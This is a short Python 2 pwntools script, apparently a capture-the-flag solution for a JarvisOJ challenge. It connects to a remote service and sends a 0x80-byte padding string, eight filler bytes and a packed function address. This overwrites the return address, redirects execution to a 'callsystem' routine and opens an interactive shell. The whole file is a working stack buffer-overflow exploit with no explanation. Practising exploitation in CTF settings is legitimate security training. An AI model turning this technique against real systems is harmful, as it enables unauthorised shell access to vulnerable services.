#!/usr/bin/env python2
from pwn import *

callsystem_addr = 0x0000000000400596
conn = remote('pwn2.jarvisoj.com', 9881)

print conn.read(),
conn.send_raw('A' * 0x80 + 'fuckfuck' + pack(callsystem_addr, 64))
conn.interactive()
